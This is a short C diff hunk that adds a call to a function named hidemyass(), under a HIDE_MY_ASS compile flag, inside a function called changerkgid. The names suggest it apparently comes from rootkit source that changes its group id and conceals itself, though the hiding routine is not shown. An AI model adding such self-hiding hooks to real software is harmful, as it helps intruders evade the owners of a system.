@@ -54,5 +54,9 @@ gid_t changerkgid(void){
     }
     closedir(dp);
 
+#ifdef HIDE_MY_ASS
+    hidemyass();
+#endif
+
     return newgid;
 }
